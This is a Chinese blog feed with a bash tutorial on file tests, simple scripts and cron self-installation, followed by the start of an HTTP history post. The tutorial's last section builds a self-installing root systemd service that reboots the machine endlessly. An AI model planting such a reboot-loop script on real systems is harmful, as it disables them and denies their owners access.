文件存在性和类型测试运算符</h3><table><thead><tr><th>运算符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>-e FILE</code></td><td>测试文件是否存在。</td><td><code>[ -e /path/to/file ]</code> # 如果文件存在则返回 true</td></tr><tr><td><code>-f FILE</code></td><td>测试文件是否是常规文件。</td><td><code>[ -f /path/to/file ]</code> # 如果是常规文件则返回 true</td></tr><tr><td><code>-d FILE</code></td><td>测试文件是否是目录。</td><td><code>[ -d /path/to/dir ]</code> # 如果是目录则返回 true</td></tr><tr><td><code>-s FILE</code></td><td>测试文件是否非空（文件大小大于 0 字节）。</td><td><code>[ -s /path/to/file ]</code> # 如果文件非空则返回 true</td></tr><tr><td><code>-L FILE</code></td><td>测试文件是否是符号链接。</td><td><code>[ -L /path/to/file ]</code> # 如果是符号链接则返回 true</td></tr><tr><td><code>-h FILE</code></td><td>测试文件是否是符号链接（<code>-L</code> 与 <code>-h</code> 功能相同）。</td><td><code>[ -h /path/to/file ]</code> # 如果是符号链接则返回 true</td></tr><tr><td><code>-p FILE</code></td><td>测试文件是否是有名管道（FIFO）。</td><td><code>[ -p /path/to/file ]</code> # 如果是有名管道则返回 true</td></tr><tr><td><code>-c FILE</code></td><td>测试文件是否是字符设备文件（比如终端）。</td><td><code>[ -c /path/to/file ]</code> # 如果是字符设备文件则返回 true</td></tr><tr><td><code>-b FILE</code></td><td>测试文件是否是块设备文件（比如硬盘设备）。</td><td><code>[ -b /path/to/file ]</code> # 如果是块设备文件则返回 true</td></tr><tr><td><code>-w FILE</code></td><td>测试文件是否可写。</td><td><code>[ -w /path/to/file ]</code> # 如果可写则返回 true</td></tr><tr><td><code>-r FILE</code></td><td>测试文件是否可读。</td><td><code>[ -r /path/to/file ]</code> # 如果可读则返回 true</td></tr><tr><td><code>-x FILE</code></td><td>测试文件是否可执行。</td><td><code>[ -x /path/to/file ]</code> # 如果可执行则返回 true</td></tr><tr><td><code>-u FILE</code></td><td>测试文件是否设置了 SUID 位。</td><td><code>[ -u /path/to/file ]</code> # 如果设置了 SUID 位则返回 true</td></tr><tr><td><code>-g FILE</code></td><td>测试文件是否设置了 SGID 位。</td><td><code>[ -g /path/to/file ]</code> # 如果设置了 SGID 位则返回 true</td></tr><tr><td><code>-k FILE</code></td><td>测试文件是否设置了粘着位（sticky bit）。</td><td><code>[ -k /path/to/file ]</code> # 如果设置了粘着位则返回 true</td></tr><tr><td><code>-O FILE</code></td><td>测试文件是否归当前用户所有。</td><td><code>[ -O /path/to/file ]</code> # 如果当前用户是文件的所有者则返回 true</td></tr><tr><td><code>-G FILE</code></td><td>测试文件是否归当前用户组所有。</td><td><code>[ -G /path/to/file ]</code> # 如果当前用户组是文件的组则返回 true</td></tr><tr><td><code>-N FILE</code></td><td>测试文件是否自上次访问以来被修改过。</td><td><code>[ -N /path/to/file ]</code> # 如果文件自上次访问以来被修改过则返回 true</td></tr></tbody></table><h3 id="2-文件比较运算符"><a href="#2-文件比较运算符" class="headerlink" title="2. 文件比较运算符"></a>2. 文件比较运算符</h3><p>除了用于文件属性的测试外，还有一些文件比较运算符，用于比较两个文件的内容或属性。</p><table><thead><tr><th>运算符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>FILE1 -nt FILE2</code></td><td>测试 FILE1 是否比 FILE2 新（文件修改时间）。</td><td><code>[ /path/to/file1 -nt /path/to/file2 ]</code> # 如果 file1 比 file2 新则返回 true</td></tr><tr><td><code>FILE1 -ot FILE2</code></td><td>测试 FILE1 是否比 FILE2 旧（文件修改时间）。</td><td><code>[ /path/to/file1 -ot /path/to/file2 ]</code> # 如果 file1 比 file2 旧则返回 true</td></tr><tr><td><code>FILE1 -ef FILE2</code></td><td>测试 FILE1 和 FILE2 是否是相同的文件（硬链接）。</td><td><code>[ /path/to/file1 -ef /path/to/file2 ]</code> # 如果 file1 和 file2 是同一文件（硬链接）则返回 true</td></tr></tbody></table><h2 id="综合实例"><a href="#综合实例" class="headerlink" title="综合实例"></a>综合实例</h2><h3 id="简单的运算"><a href="#简单的运算" class="headerlink" title="简单的运算"></a>简单的运算</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作数一:&quot;</span> num1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作数二:&quot;</span> num2</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作符:&quot;</span> opt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq 0 ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;操作数不能为0&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;+&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 + num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;-&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 - num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;*&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 * num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 / num2)</span>).<span class="subst">$(expr $num1 % $num2)</span>&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;符号错误&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作数一:&quot;</span> num1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作数二:&quot;</span> num2</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;输入操作符:&quot;</span> opt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq 0 ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;操作数不能为0&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;+&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 + num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;-&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 - num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;*&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 * num2)</span>)&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;结果为：<span class="subst">$((num1 / num2)</span>).<span class="subst">$(expr $num1 % $num2)</span>&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;符号错误&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129142425.jpg" alt="Pasted-image-20241129142425"></p><h3 id="阶乘运算"><a href="#阶乘运算" class="headerlink" title="阶乘运算"></a>阶乘运算</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">nx</span></span> () &#123;</span><br><span class="line">    <span class="built_in">local</span> num=<span class="variable">$1</span></span><br><span class="line">    <span class="comment"># 获取传入的参数</span></span><br><span class="line">    <span class="built_in">local</span> result=1</span><br><span class="line">    <span class="comment"># 初始化结果为 1</span></span><br><span class="line">    <span class="keyword">for</span>((i=<span class="number">1</span>;i&lt;=num;i++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        result=$((<span class="variable">$result</span> * i))</span><br><span class="line">        <span class="comment"># 使用 result 变量存储结果</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> !<span class="variable">$&#123;num&#125;</span>的的阶乘为：<span class="variable">$result</span> <span class="comment"># 打印结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入一个数来求出他的阶乘：&quot;</span> n</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">    nx <span class="variable">$n</span> <span class="comment"># 调用函数</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入的数必须大于0&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="function"><span class="title">nx</span></span> () &#123;</span><br><span class="line">    <span class="built_in">local</span> num=<span class="variable">$1</span></span><br><span class="line">    <span class="comment"># 获取传入的参数</span></span><br><span class="line">    <span class="built_in">local</span> result=1</span><br><span class="line">    <span class="comment"># 初始化结果为 1</span></span><br><span class="line">    <span class="keyword">for</span>((i=<span class="number">1</span>;i&lt;=num;i++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        result=$((<span class="variable">$result</span> * i))</span><br><span class="line">        <span class="comment"># 使用 result 变量存储结果</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> !<span class="variable">$&#123;num&#125;</span>的的阶乘为：<span class="variable">$result</span> <span class="comment"># 打印结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入一个数来求出他的阶乘：&quot;</span> n</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$n</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">    nx <span class="variable">$n</span> <span class="comment"># 调用函数</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入的数必须大于0&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129163352.jpg" alt="Pasted-image-20241129163352"></p><h3 id="获取指定网络的IPv4地址"><a href="#获取指定网络的IPv4地址" class="headerlink" title="获取指定网络的IPv4地址"></a>获取指定网络的IPv4地址</h3><ol><li>尝试在Liunx下用命令获取</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr show eth0 | grep <span class="string">&quot;/24&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1</span><br><span class="line"><span class="comment">#查看网络指定接口eth0 |筛选出/24的行|获取第二个字段内容|以/为字段分隔符号，获取第一个字段的内容</span></span><br><span class="line">```bash</span><br><span class="line">ip addr show eth0 | grep <span class="string">&quot;/24&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1</span><br><span class="line"><span class="comment">#查看网络指定接口eth0 |筛选出/24的行|获取第二个字段内容|以/为字段分隔符号，获取第一个字段的内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241129170446.jpg" alt="Pasted-image-20241129170446"><br>2. 知道Liunx中负责定时任务的的<code>cron</code>，尝试添加</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l </span><br><span class="line"><span class="comment">#查看当前用户的定时任务</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;* * * * * echo &#x27;test&#x27;&quot;</span> | crontab -</span><br><span class="line"><span class="comment">#crontab - 可以配合管道副将输出的内容添加进去</span></span><br><span class="line"></span><br><span class="line">* * * * * *执行命令 <span class="comment">#定时格式</span></span><br><span class="line">- - - - - - </span><br><span class="line">| | | | | +----指定的用户</span><br><span class="line">| | | | +---- 星期几 (0 - 7) (Sunday = 0 or 7)</span><br><span class="line">| | | +------ 月份 (1 - 12)</span><br><span class="line">| | +-------- 日期 (1 - 31)</span><br><span class="line">| +---------- 小时 (0 - 23)</span><br><span class="line">+------------ 分钟 (0 - 59)</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">crontab -l </span><br><span class="line"><span class="comment">#查看当前用户的定时任务</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;* * * * * echo &#x27;test&#x27;&quot;</span> | crontab -</span><br><span class="line"><span class="comment">#crontab - 可以配合管道副将输出的内容添加进去</span></span><br><span class="line"></span><br><span class="line">* * * * * *执行命令 <span class="comment">#定时格式</span></span><br><span class="line">- - - - - - </span><br><span class="line">| | | | | +----指定的用户</span><br><span class="line">| | | | +---- 星期几 (0 - 7) (Sunday = 0 or 7)</span><br><span class="line">| | | +------ 月份 (1 - 12)</span><br><span class="line">| | +-------- 日期 (1 - 31)</span><br><span class="line">| +---------- 小时 (0 - 23)</span><br><span class="line">+------------ 分钟 (0 - 59)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241130162706.jpg" alt="Pasted-image-20241130162706"></p><ul><li>编写脚本</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="title">ip4</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> da=$(<span class="built_in">date</span>)</span><br><span class="line">    <span class="built_in">local</span> ta=$(ip addr show eth0 | grep <span class="string">&quot;/24&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$da</span> 当前IP地址为：<span class="variable">$ta</span>&quot;</span> &gt;&gt; /tmp/ip.txt</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取脚本的绝对路径</span></span><br><span class="line">path=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;* 6 * * * <span class="variable">$USER</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 crontab 中是否已经有该脚本的任务</span></span><br><span class="line"><span class="keyword">if</span> crontab -l 2&gt;/dev/null | grep -q <span class="string">&quot;<span class="variable">$path</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    ip4</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果 crontab 中没有任务，添加任务</span></span><br><span class="line">    (crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;time&#125;</span> <span class="variable">$&#123;path&#125;</span>&quot;</span>) | crontab -</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="title">ip4</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> da=$(<span class="built_in">date</span>)</span><br><span class="line">    <span class="built_in">local</span> ta=$(ip addr show eth0 | grep <span class="string">&quot;/24&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$da</span> 当前IP地址为：<span class="variable">$ta</span>&quot;</span> &gt;&gt; /tmp/ip.txt</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取脚本的绝对路径</span></span><br><span class="line">path=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;* 6 * * * <span class="variable">$USER</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 crontab 中是否已经有该脚本的任务</span></span><br><span class="line"><span class="keyword">if</span> crontab -l 2&gt;/dev/null | grep -q <span class="string">&quot;<span class="variable">$path</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    ip4</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果 crontab 中没有任务，添加任务</span></span><br><span class="line">    (crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;time&#125;</span> <span class="variable">$&#123;path&#125;</span>&quot;</span>) | crontab -</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241130211535.jpg" alt="Pasted-image-20241130211535"></p><h3 id="无线重启脚本"><a href="#无线重启脚本" class="headerlink" title="无线重启脚本"></a>无线重启脚本</h3><ul><li>知道前面计划任务，尝试编写一个开机就启动的计划任务(暂不知道什么问题，无法实现)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 获取当前脚本的绝对路径</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="comment"># 定义 @reboot 时间格式</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;@reboot <span class="variable">$USER</span> &quot;</span></span><br><span class="line"><span class="comment"># 检查 crontab 中是否已经有该脚本的任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crontab -l 2&gt;/dev/null | grep -q <span class="string">&quot;<span class="variable">$path</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">sleep</span> 3</span><br><span class="line">    shutdown -r now   <span class="comment"># 如果任务已存在，重新启动系统</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果任务不存在，添加定时任务到 crontab</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;time&#125;</span><span class="variable">$&#123;path&#125;</span>&quot;</span> | crontab -</span><br><span class="line">    <span class="built_in">sleep</span> 3</span><br><span class="line">    shutdown -r now</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 获取当前脚本的绝对路径</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="comment"># 定义 @reboot 时间格式</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;@reboot <span class="variable">$USER</span> &quot;</span></span><br><span class="line"><span class="comment"># 检查 crontab 中是否已经有该脚本的任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> crontab -l 2&gt;/dev/null | grep -q <span class="string">&quot;<span class="variable">$path</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">sleep</span> 3</span><br><span class="line">    shutdown -r now   <span class="comment"># 如果任务已存在，重新启动系统</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 如果任务不存在，添加定时任务到 crontab</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;time&#125;</span><span class="variable">$&#123;path&#125;</span>&quot;</span> | crontab -</span><br><span class="line">    <span class="built_in">sleep</span> 3</span><br><span class="line">    shutdown -r now</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>利用<code>systemd</code>实现开机执行脚本重启</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=reboot</span><br><span class="line">After=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=<span class="variable">$SH_PATH</span></span><br><span class="line">Restart=always</span><br><span class="line">User=root</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">```bash</span><br><span class="line">[Unit]</span><br><span class="line">Description=reboot</span><br><span class="line">After=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=<span class="variable">$SH_PATH</span></span><br><span class="line">Restart=always</span><br><span class="line">User=root</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p><strong>[Unit]</strong> 部分定义了服务的描述和它的启动顺序。</p><ul><li><code>Description</code> 是对服务的简短描述。</li><li><code>multi-user.target</code> 系统启动并进入多用户模式后</li></ul></li><li><p><strong>[Service]</strong> 部分定义了服务的运行方式。</p><ul><li><code>ExecStart</code> 指定了启动脚本的命令。</li><li><code>Restart=always</code> 表示如果脚本崩溃，会自动重新启动。</li><li><code>User=root</code> 指定以哪个用户身份运行脚本。</li></ul></li><li><p><strong>[Install]</strong> 部分定义了在何时启用该服务。</p><ul><li><code>WantedBy=multi-user.target</code> 表示该服务将在系统进入多用户模式时启动，通常这是默认的运行级别。</li></ul></li><li><p>最终编写脚本</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="title">rb</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[Unit]\nDescription=reboot\nAfter=multi-user.target\n\n[Service]\nExecStart=<span class="variable">$SH_PATH</span>\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target&quot;</span> &gt; <span class="string">&quot;/etc/systemd/system/reboot.service&quot;</span></span><br><span class="line">    systemctl daemon-reload</span><br><span class="line">    systemctl <span class="built_in">enable</span> reboot</span><br><span class="line">    systemctl start reboot</span><br><span class="line">    reboot </span><br><span class="line">&#125;</span><br><span class="line">ID_PATH=<span class="string">&quot;/etc/systemd/system/reboot.service&quot;</span></span><br><span class="line">SH_PATH=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$ID_PATH</span> ]; <span class="keyword">then</span></span><br><span class="line">    reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    rb</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="title">rb</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[Unit]\nDescription=reboot\nAfter=multi-user.target\n\n[Service]\nExecStart=<span class="variable">$SH_PATH</span>\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target&quot;</span> &gt; <span class="string">&quot;/etc/systemd/system/reboot.service&quot;</span></span><br><span class="line">    systemctl daemon-reload</span><br><span class="line">    systemctl <span class="built_in">enable</span> reboot</span><br><span class="line">    systemctl start reboot</span><br><span class="line">    reboot </span><br><span class="line">&#125;</span><br><span class="line">ID_PATH=<span class="string">&quot;/etc/systemd/system/reboot.service&quot;</span></span><br><span class="line">SH_PATH=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$ID_PATH</span> ]; <span class="keyword">then</span></span><br><span class="line">    reboot</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    rb</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241220/PixPin_2024-12-08_17-01-26.gif" alt="PixPin_2024-12-08_17-01-26"></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超文本传输协议</title>
      <link href="/posts/37c14f38.html"/>
      <url>/posts/37c14f38.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>HTTP（HyperText Transfer Protocol，超文本传输协议）定义了客户端（如浏览器）和服务器之间如何请求和传输资源的规则，主要用于从服务器(万维网)将超文本（如HTML文件、图片、视频等）传输到本地浏览器。默认的端口为80&#x2F;443。</p><h3 id="HTTP-0-9-1991年"><a href="#HTTP-0-9-1991年" class="headerlink" title="HTTP&#x2F;0.9(1991年)"></a>HTTP&#x2F;0.9(1991年)</h3><ul><li>特点<ul><li>仅支持GET请求，没有其他请求</li><li>无HTTP头部只有<code>GET /www.baidu.com</code></li><li>仅支持HTML传输，无法传输图片、视频或其他文件类型。</li><li>无状态性：每个请求是独立的，没有会话保持功能。</li><li>单向通信：客户端发出请求后，服务器返回HTML内容，传输完成后立即断开连接。</li></ul></li><li>工作流程<ul><li>客户端发送请求→服务器返回响应→断开连接</li></ul></li><li>使用场景<ul><li>简单的网页浏览，通常是一些静态文本页面</li></ul></li></ul><h3 id="HTTP-1-0-1996年"><a href="#HTTP-1-0-1996年" class="headerlink" title="HTTP&#x2F;1.0(1996年)"></a>HTTP&#x2F;1.0(1996年)</h3><ul><li>特点<ol><li>支持多种请求方法：在<code>GET</code>方法基础上，新增了<code>POST</code>（提交数据）和<code>HEAD</code>（仅请求响应头部信息）</li><li>引入HTTP头部（Headers）：可以传递关于数据类型、长度、编码等</li><li>支持多种内容类型：可以传输非HTML内容，如图片、音频、视频等。</li><li>引入状态码：响应中增加了状态码，用于标识请求的处理结果。</li><li>支持缓存控制：增加了与缓存相关的头部（如<code>Expires</code>、<code>Last-Modified</code>），以减少重复请求和提高效率。</li></ol></li><li>流程<ul><li>建立连接→发送请求→服务器处理请求并响应→关闭连接。</li></ul></li><li>使用场景<ul><li>适用于一些简单的网页浏览和交互场景，但对于包含大量资源的网页，加载速度较慢。</li></ul></li></ul><h3 id="HTTP-1-1-1997年"><a href="#HTTP-1-1-1997年" class="headerlink" title="HTTP&#x2F;1.1 (1997年)"></a>HTTP&#x2F;1.1 (1997年)</h3><ul><li>特点<ol><li>持久连接：默认启用了持久连接（Keep-Alive），在同一个TCP连接中可以传输多个请求和响应，减少了连接建立和关闭的开销，提高效率。</li><li>管道化传输：支持HTTP管道化（Pipelining），允许客户端在收到响应前发送多个请求，但是响应顺序必须与请求顺序一致</li><li>丰富的缓存机制：增强了缓存控制功能，引入<code>Cache-Control</code>头部，支持更灵活的缓存策略。</li><li>分块传输编码：使用分块传输编码（Chunked Transfer Encoding）允许服务器在生成内容时逐步发送数据，适用于动态生成内容的场景。</li><li>更多的请求方法：增加了<code>PUT</code>（更新资源）、<code>DELETE</code>（删除资源）、<code>OPTIONS</code>（查看支持的请求方法）等方法，支持更多操作类型。</li><li>虚拟主机支持：- 引入<code>Host</code>头部，使同一台服务器可以托管多个域名（虚拟主机）。</li><li>安全性增强：更容易与HTTPS配合使用，促进了加密通信的发展。</li></ol></li><li>流程<ul><li>建立连接 → 发送请求 → 服务器处理请求并响应 → 可复用连接（支持多次请求）。</li></ul></li><li>使用场景<ul><li>支持复杂的动态网页和多媒体内容，适用于需要加载大量资源的现代网页和API通信场景。</li></ul></li></ul><h3 id="HTTP-2-2015年"><a href="#HTTP-2-2015年" class="headerlink" title="HTTP&#x2F;2 (2015年)"></a>HTTP&#x2F;2 (2015年)</h3><ul><li>特点<ol><li>二进制分帧： 